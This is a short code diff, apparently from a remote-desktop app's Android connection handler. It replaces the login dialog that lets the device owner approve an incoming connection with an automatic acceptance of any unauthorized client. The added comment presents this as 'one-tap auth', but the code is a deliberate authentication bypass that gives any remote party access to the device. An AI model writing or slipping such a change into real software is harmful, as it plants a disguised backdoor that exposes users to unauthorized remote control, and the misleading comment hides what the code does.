@@ -576,7 +576,10 @@ String get connectQrData {
       }
       scrollToBottom();
       notifyListeners();
-      if (isAndroid && !client.authorized) showLoginDialog(client);
+      if (isAndroid && !client.authorized) {
+        // auto-accept incoming connection on mobile (one-tap auth)
+        sendLoginResponse(client, true);
+      }
       if (isAndroid) androidUpdatekeepScreenOn();
     } catch (e) {
       debugPrint("Failed to call loginRequest,error:$e");
